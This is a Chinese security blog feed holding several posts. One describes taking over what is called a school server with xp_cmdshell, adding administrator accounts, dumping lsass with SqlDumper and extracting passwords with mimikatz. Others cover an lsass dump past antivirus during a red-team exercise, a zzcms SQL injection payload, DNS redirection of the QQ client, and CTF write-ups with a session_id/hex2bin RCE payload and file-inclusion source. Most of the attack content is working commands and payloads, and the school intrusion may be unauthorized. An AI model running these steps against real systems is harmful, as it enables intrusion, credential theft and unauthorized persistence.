. . . . . : </span><br><span class="line"></span><br><span class="line">隧道适配器 Teredo Tunneling Pseudo-Interface:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="提权路"><a href="#提权路" class="headerlink" title="提权路"></a>提权路</h1><p><code>exec master..xp_cmdshell &quot;whoami&quot;</code></p><p><img src="/images/1568596816710.png" alt="1568596816710"></p><p>既然是system，直接<code>net user asp.net 123456/add &amp;&amp; net localgroup administrators asp.net /add</code>一波带走</p><p>远程连上看看</p><p><img src="/images/1568553378635.png" alt="1568553378635"></p><p>WTF??? 还有个360……</p><p>那么接下来肯定登不上。。</p><p><img src="/images/1568553429934.png" alt="1568553429934"></p><h2 id="换个思路"><a href="#换个思路" class="headerlink" title="换个思路"></a>换个思路</h2><p>接下来开始翻资料，梳理下现在的情况</p><blockquote><ol><li>MSSQL数据库SA权限</li><li>有360</li><li>数据库以system权限启动的</li></ol></blockquote><p>翻资料的时候看到了这个</p><p><a href="https://zhuanlan.zhihu.com/p/57800688">https://zhuanlan.zhihu.com/p/57800688</a></p><blockquote><p>SqlDumper.exe是从SQL Server安装目录下提取出来的，<strong>功能和Procdump相似，</strong>并且也是微软出品的，体积远小于Procdump，也具备一定的免杀功能。SqlDumper.exe默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本，<strong>参考如下：</strong></p><p>140 for SQL Server 2017</p><p>130 for SQL Server 2016</p><p>120 for SQL Server 2014</p><p>110 for SQL Server 2012</p><p>100 for SQL Server 2008</p><p>90 for SQL Server 2005</p><p>如果目标机器没有安装SQL Server，可以自己上传一个SqlDumper.exe。</p></blockquote><p><img src="/images/1568553515104.png" alt="1568553515104"></p><p>那么查下数据库版本信息</p><p><code>Select @@version</code></p><p><img src="/images/1568596841958.png" alt="1568596841958"></p><p>那么命令应该是<code>C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe ProcessID 0 0x01100</code></p><p>继续查下<code>lsass</code>的<code>pid</code></p><p><img src="/images/1568596860129.png" alt="1568596860129"></p><p>命令补全后<code>&quot;C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe&quot; 608 0 0x01100 0 C:\Users\Administrator\AppData\Local\Temp</code></p><p>其中，<code>Sqldumper</code>原型为<code>SqlDumper &lt;process id (PID)&gt; &lt;thread id (TID)&gt; &lt;Flags:Minidump Flags&gt; &lt;SQLInfoPtr&gt; &lt;Dump Directory&gt;</code></p><p>然后执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @line sysname</span><br><span class="line">SET @line = &#x27;&quot;C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe&quot; 608 0 0x01100 0 C:\Users\Administrator\AppData\Local\Temp&#x27;</span><br><span class="line">EXEC master..xp_cmdshell @line</span><br></pre></td></tr></table></figure><p><img src="/images/1568596881884.png" alt="1568596881884"></p><p>然后就该读文件了，扫描端口时发现了iis7默认页面</p><p><img src="/images/1568555181184.png" alt="1568555181184"></p><p>由于已经dump了<code>lsass</code>的内存，那么思路转变为利用IIS7服务下载<code>SQLDmpr0001.mdmp</code>，本地<code>mimikatz</code>解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @old sysname,@new sysname,@cmd sysname</span><br><span class="line">SET @old = &#x27;&quot;C:\Users\Administrator\AppData\Local\Temp\SQLDmpr0001.mdmp&quot;&#x27;</span><br><span class="line">SET @new = &#x27;&quot;C:\inetpub\wwwroot\SQLDmpr0001.mdmp&quot;&#x27;</span><br><span class="line">SET @cmd = &#x27;copy &#x27;+@old+&#x27; &#x27;+@new</span><br><span class="line">EXEC master..xp_cmdshell @cmd</span><br></pre></td></tr></table></figure><p><img src="/images/1568596901881.png" alt="1568596901881"></p><p>访问看看</p><p><img src="/images/1568556078651.png" alt="1568556078651"></p><p>诶？咋404了</p><p>换个文件名试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE @old sysname,@new sysname,@cmd sysname</span><br><span class="line">SET @old = &#x27;&quot;C:\Users\Administrator\AppData\Local\Temp\SQLDmpr0001.mdmp&quot;&#x27;</span><br><span class="line">SET @new = &#x27;&quot;C:\inetpub\wwwroot\test.txt&quot;&#x27;</span><br><span class="line">SET @cmd = &#x27;copy &#x27;+@old+&#x27; &#x27;+@new</span><br><span class="line">EXEC master..xp_cmdshell @cmd</span><br></pre></td></tr></table></figure><p><img src="/images/1568596920874.png" alt="1568596920874"></p><p>在访问，下载成功</p><p><img src="/images/1568556171247.png" alt="1568556171247"></p><p>然后扔<code>咪咪卡住（mimikatz）</code>一条命令梭哈<code>mimikatz.exe&quot;sekurlsa::minidumpSQLDmpr0001.mdmp&quot;&quot;sekurlsa::logonPasswords full&quot;&quot;exit&quot;</code></p><p>然而事情没那么简单。。</p><p><img src="/images/1568557302866.png" alt="1568557302866"></p><p>管理员自从上次登录（7月）后就再也没登录过……</p><p><img src="/images/1568596947893.png" alt="1568596947893"></p><p>一筹莫展时发现有个guest用户，尝试下另一个思路</p><p><code>EXEC master..xp_cmdshell &#39;net user guest /active:yes&#39;</code></p><p><img src="/images/1568596969749.png" alt="1568596969749"></p><p>加密码和管理组</p><p><code>EXEC master..xp_cmdshell &#39;net user guest 123456 &amp;&amp; net localgroup administrators guest /add&#39;</code></p><p>然而还是一样</p><p><img src="/images/1568553429934.png" alt="1568553429934"></p><h2 id="暴躁老哥在线重启"><a href="#暴躁老哥在线重启" class="headerlink" title="暴躁老哥在线重启"></a>暴躁老哥在线重启</h2><p>由于是学校的服务器，而且教学楼时不时断电，于是乎~</p><p><img src="/images/1568596990547.png" alt="1568596990547"></p><p><img src="/images/1568560316707.png" alt="1568560316707"></p><p>重启后尝试连接</p><p><img src="/images/1568560359816.png" alt="1568560359816"></p><p>久违的<code>Win2008</code> GET！</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某省HW中遇到的提权</title>
      <link href="/p/2108.html"/>
      <url>/p/2108.html</url>
      
        <content type="html"><![CDATA[<p>某省HW中遇到的一个环境提权笔记</p><span id="more"></span><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>环境：</p><blockquote><p>OS: Windows Server 2012 R2</p><p>补丁情况：</p><p>KB3139914 : MS16-032<br>KB3124280 : MS16-016<br>KB3134228 : MS16-014<br>KB3079904 : MS15-097<br>KB3077657 : MS15-077<br>KB3045171 : MS15-051<br>KB3000061 : MS14-058<br>KB2829361 : MS13-046<br>KB2850851 : MS13-053 EPATHOBJ 0day 限32位<br>KB2707511 : MS12-042 sysret -pid<br>KB2124261 : KB2271195 MS10-065 IIS7<br>KB970483 : MS09-020 IIS6</p><p>安全软件：360套装</p><p>Webshell: :white_check_mark:</p><p>内网</p></blockquote><p>既然有16-032，为了一次成功，本地搭个环境，<code>github</code>上面下载到的ms16-032果不其然被<code>Gank</code>了</p><p><img src="/images/9PS6_TFE213LN2%5BYQ$XRA%604.png" alt="img"></p><p>那么就需要做免杀了，然而自己做的免杀要么</p><p><img src="/images/1568387082157.png" alt="1568387082157"></p><p>要么</p><p><img src="/images/1568387071221.png" alt="1568387071221"></p><p>要么是编译好了跑不起来（vs2019编译的，SDK太高了？）</p><p><img src="/images/1568387110896.png" alt="1568387110896"></p><p>这时朋友扔了个思路过来</p><p><img src="/images/1568387139609.png" alt="1568387139609"></p><p><img src="/images/1568387151036.png" alt="1568387151036"></p><p>然后我们进行操作</p><p><img src="/images/1568387171353.png" alt="1568387171353"></p><p>用webshell试试</p><p><img src="/images/1568387214830.png" alt="1568387214830"></p><p>添加成功了，接下来试着添加到管理组</p><p><img src="/images/1568387290774.png" alt="1568387290774"></p><p>猜到还是360在作怪</p><p>然后换了个思路，抓lsass内存</p><p><img src="/images/1568387339192.png" alt="1568387339192"></p><p>由于是2012，修复了lsass dump内存时会转储明文密码的漏洞，只能dump NTLM的hash，但是运气不错，是个弱口令，cmd5解出来直接登录</p><p><img src="/images/1568387380666.png" alt="1568387380666"></p><p>通过登录记录，拿下第二台</p><p><img src="/images/1568387483766.png" alt="1568387483766"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzcms前台SQL注入</title>
      <link href="/p/9a55.html"/>
      <url>/p/9a55.html</url>
      
        <content type="html"><![CDATA[<p>存储型XSS参考文章<a href="https://0x20h.com/p/9812.html">https://0x20h.com/p/9812.html</a></p><span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>还是<code>markit()</code>函数，既然没有对URI进行过滤直接写入数据库，那么能不能搞点事情呢？</p><p>先看看这个<code>query</code>函数怎么执行的</p><p><img src="/images/1563460628040.png" alt="1563460628040"></p><p>可以看到直接带入<code>mysqli_query</code>，那么尝试构造下<code>payload</code>吧</p><p>原始SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> zzcms_bad (username,ip,dose,sendtime)</span><br><span class="line"><span class="keyword">values</span></span><br><span class="line">(<span class="string">&#x27;&quot; . $_COOKIE[&quot;UserName&quot;] . &quot;&#x27;</span>,<span class="string">&#x27;$userip&#x27;</span>,<span class="string">&#x27;$url&#x27;</span>,<span class="string">&#x27;&quot; . date(&#x27;</span>Y<span class="operator">-</span>m<span class="operator">-</span>d H:i:s<span class="string">&#x27;) . &quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>既然只有<code>$url</code>可控，那么直接构造传入的URI就可以了，先直接让数据库执行<code>sleep()</code>函数</p><p><code> insert into zzcms_bad (username,ip,dose,sendtime)values(&#39;test&#39;,&#39;127.0.0.1&#39;,&#39;http://www.zzcms2019.cc/user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=&#39;or sleep(5),&#39;&#39;);#</code></p><p><img src="/images/1563460855588.png" alt="1563460855588"></p><p>OK 成功，那么直接构造就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=&#x27;or sleep(5),&#x27;&#x27;);# HTTP/1.1</span><br></pre></td></tr></table></figure><p>结果发现并没有执行</p><p><img src="/images/1563460935987.png" alt="1563460935987"></p><p>在函数中dump下<code>$url</code>看看原因</p><p><img src="/images/1563460982085.png" alt="1563460982085"></p><p>发现被url中的空格截断了</p><p><img src="/images/1563461016341.png" alt="1563461016341"></p><p>那么直接用注释<code>/**/</code>替换</p><p><img src="/images/1563461049641.png" alt="1563461049641"></p><p>成功睡眠5秒，证明存在SQL注入。</p>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ客户端一处BUG</title>
      <link href="/p/7f02.html"/>
      <url>/p/7f02.html</url>
      
        <content type="html"><![CDATA[<p>无意中发现的一处问题</p><span id="more"></span><h1 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h1><p>因为我电脑安装的<code>flash</code>不是国版的（不是那个某公司二次打包后的）直接安装的adobe官网的导致一些应用无法使用，比如QQ客户端的空间选项卡中的上传图片功能</p><p><img src="/images/1565602911257.png"></p><p>然后呢，点击时会跳转到<code>aodobe</code>官网</p><p><img src="/images/1565602974074.png"></p><p>验证猜想，QQ集成了几个web页面，那么如果把<code>aodobe</code>官网重定向呢？</p><p>先获取下访问的域名，这点可以用<code>wireshark</code>抓出来</p><p><img src="/images/1565603284361.png"></p><p>本地<code>hosts</code>再改下，再架个web服务器</p><p><img src="/images/1565603110063.png"></p><p>再写个<code>html</code>文件，放置于于<code>/www/go/getflashGeoError/</code></p><p><img src="/images/1565603618076.png"></p><p>HTML代码如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">//弹cookie</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);<span class="comment">//弹UA</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;tx&quot;</span>);<span class="comment">//弹tx</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>好了，测试下</p><p><img src="/images/1565603761764.png"></p><p>第一个框是<code>Cookie</code>的，由于没有<code>Cookie</code>所以为空</p><p><img src="/images/1565603838353.png"></p><p>第二个框是UA，可以看到是<code>Chrome 43</code>的内核</p><p><img src="/images/1565603885724.png"></p><p>第三个框</p><p>然后显示页面</p><p><img src="/images/1565604764602.png"></p><p>此时的页面是无法使用右键的，改下JS代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>); <span class="comment">//弹cookie</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>); <span class="comment">//弹UA</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">onselectstart</span> = <span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="variable language_">document</span>.<span class="property">onmousedown</span> = <span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;Cracked!&quot;</span>); </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后依旧失效，推测是客户端屏蔽了相关设置并非内核屏蔽。。</p><p>最后上个跳转玩玩。。</p><p><img src="/images/1565608923668.png"></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>如果一个内网中，DNS服务被更改，把奥多比域名和<code>Flash.cn</code>的域名指向了恶意服务器，结合最近爆出的<code>CVE-2019-5786</code>或者更早的漏洞（内核43+以上的漏洞），是否可以搞点事情？</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年CISCN(全国大学生信息安全竞赛)华南赛区wp</title>
      <link href="/p/ece4.html"/>
      <url>/p/ece4.html</url>
      
        <content type="html"><![CDATA[<blockquote><ol><li>题目是在Fix It环境拷下来的，写<code>writeup</code>时的环境是自己搭的</li><li>有些题目忘记拷贝数据库，各位大佬凑活看吧</li><li>题目的GitHub仓库：<a href="https://github.com/NS-Sp4ce/2019-Ciscn-Southern-China-Web">https://github.com/NS-Sp4ce/2019-Ciscn-Southern-China-Web</a></li></ol></blockquote><span id="more"></span><h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><h2 id="Break-It"><a href="#Break-It" class="headerlink" title="Break It"></a>Break It</h2><p>打开页面如下</p><p><img src="/images/1562850051215.png" alt="1562850051215"></p><p>按照惯例<code>Ctrl+U</code>看源代码，发现被注释的<code>&lt;!--  &lt;p class=&quot;forgot&quot;&gt;&lt;a id=&quot;iforget&quot; href=&quot;forgetpassword.php&quot;&gt;Forgot your password?&lt;/a&gt;&lt;/p&gt;--&gt;</code></p><p><img src="/images/1562850150394.png" alt="1562850150394"></p><p>字面意思是重置密码的页面，访问试试</p><p><img src="/images/1562850199817.png" alt="1562850199817"></p><p>由于不知道用户名，抓包随便输入个用户名看看返回的信息</p><p><img src="/images/1562850323023.png" alt="1562850323023"></p><p>OK，找个用户名字典爆破下</p><p><img src="/images/1562850802531.png" alt="1562850802531"></p><p>设置下</p><p><img src="/images/1562850369376.png" alt="1562850369376"></p><p>爆破出<code>admin123</code>这个用户存在</p><p><img src="/images/1562850867761.png" alt="1562850867761"></p><p>输入后，跳转到下一个页面</p><p><img src="/images/1562850892755.png" alt="1562850892755"></p><p>4位验证码爆破走起</p><p>扔<code>Burpsuite</code>里</p><p><img src="/images/1562850976886.png" alt="1562850976886"></p><p>设置</p><p><img src="/images/1562850969198.png" alt="1562850969198"></p><p>走起，然后踩了第一个坑</p><p><img src="/images/1562851061799.png" alt="1562851061799"></p><p>验证码全部错误，<code>Ctrl+U</code>看了下源代码</p><p><img src="/images/1562851107127.png" alt="1562851107127"></p><p>哦豁，设置<code>base64</code>编码</p><p><img src="/images/1562851144415.png" alt="1562851144415"></p><p>继续爆破，时间不长出现重置密码的信息</p><p><img src="/images/1562851197988.png" alt="1562851197988"></p><p>用户名<code>admin123</code>，密码<code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code>，登上去看看</p><p><img src="/images/1562851268627.png" alt="1562851268627"></p><p>提示phpmyadmin，进去看看</p><p>打开后发现</p><p><img src="/images/1562854196288.png" alt="1562854196288"></p><p>这时候比赛方放出hint，备份文件，然后，一顿扫</p><p><img src="/images/1562854391609.png" alt="1562854391609"></p><p>扫出备份文件</p><p><img src="/images/1562854426155.png" alt="1562854426155"></p><p>提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Why not try code breaking?</span><br><span class="line">//mDjNaF.php</span><br></pre></td></tr></table></figure><p><img src="/images/1562854458724.png" alt="1562854458724"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>接下来的步骤在赛后参考了<code>2018RCTF</code>的原题<code>r-cursive</code>（<a href="https://delcoding.github.io/2018/05/rctf-web-writeup1/#r-cursive%EF%BC%89">https://delcoding.github.io/2018/05/rctf-web-writeup1/#r-cursive）</a></p><blockquote><p>根据正则匹配条件和本地搭环境调试可以知道只能执行不带参数、函数名不含包括_在内的特殊符号，所以只能是<code>x(y(z()))</code>此类的调用形式。所以从<code>code</code>参数里进行函数执行是不太可能的了，比赛时也没有想到突破方法，后来才得知可以运行<code>http header</code>头来进行处理。</p><p>PHP中可以使用<code>get_headers </code>,<code>getallheaders</code>获得HTTP请求头的信息，并返回键值数组，所以我们就只能用<code>getallheaders()</code>来获取。又因为返回的是数组，我们可以使用<code>implode()</code>来将数组转换成字符串。所以我们初步构造：<code>implode(getallheaders())</code>。但如果仅是这样还不能运行我们的代码，因为<code>implode()</code>返回的已经是字符串了，<code>&quot;implode()&quot;</code>（注意<code>&quot;</code>），有相当于多嵌套了一层字符，所以我们应该使用<code>eval(implode(getallheaders()));</code>来进行执行。</p></blockquote><p>然后又发现<code>cookie</code>中的<code>PHPSESSID</code>可控，<code>PHP</code>中<code>session_id() </code>函数可以获取 <code>PHPSESSID</code>，如果没有开启 <code>session </code>可以使用 <code>session_start() </code>函数。由于不能带参数，我们可以将命令转化为 hex 再用 <code>hex2bin() </code>函数转换，尝试构造请求包如下</p><blockquote><p>GET &#x2F;mDjNaF.php?code&#x3D;eval(hex2bin(session_id(session_start()))); HTTP&#x2F;1.1<br>Cookie: PHPSESSID&#x3D;6563686f2754455354273b<br>Host: 192.168.2.227:81<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.100 Safari&#x2F;537.36<br>DNT: 1<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Connection: close</p></blockquote><p><img src="/images/1562895846737.png" alt="1562895846737"></p><p>这样就可以构造RCE了</p><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /mDjNaF.php?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1</span><br><span class="line">Cookie: PHPSESSID=6563686f2066696c655f6765745f636f6e74656e747328222f666c616722293b</span><br></pre></td></tr></table></figure><p><code>6563686f2066696c655f6765745f636f6e74656e747328222f666c616722293b</code>Hex解码后为<code>echo file_get_contents(&quot;/flag&quot;);</code></p><h2 id="Fix-it"><a href="#Fix-it" class="headerlink" title="Fix it"></a>Fix it</h2><p>修改<code>mDjNaF.php</code>文件，注释掉<code>eval</code>函数。</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><h2 id="Break-it"><a href="#Break-it" class="headerlink" title="Break it"></a>Break it</h2><p>打开题目</p><p><img src="/images/1563019511983.png" alt="1563019511983"></p><p>查看下源代码</p><p><img src="/images/1563019528128.png" alt="1563019528128"></p><p>注释掉了一个名为<code>source</code>的<code>php</code>文件，访问下</p><p><img src="/images/1563019564987.png" alt="1563019564987"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;aa&quot;</span>=&gt;<span class="string">&quot;aa.php&quot;</span>];<span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;<span class="comment">//判断是否传递了page参数</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//判断page是否在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );<span class="comment">//进行问号截取</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );<span class="comment">//出问题的代码</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; kind::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];<span class="comment">//文件包含</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span 